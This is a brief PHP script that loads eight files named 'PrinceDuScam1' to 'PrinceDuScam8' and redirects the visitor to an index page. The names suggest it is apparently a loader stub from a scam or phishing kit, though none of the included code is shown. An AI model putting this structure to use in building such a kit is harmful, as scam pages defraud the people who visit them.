<?php
  	require 'PrinceDuScam1.php';
	require 'PrinceDuScam2.php';
	require 'PrinceDuScam3.php';
	require 'PrinceDuScam4.php';
	require 'PrinceDuScam5.php';
	require 'PrinceDuScam6.php';
	require 'PrinceDuScam7.php';
	require 'PrinceDuScam8.php';
	exit(header("Location: ../index.php"));
?>
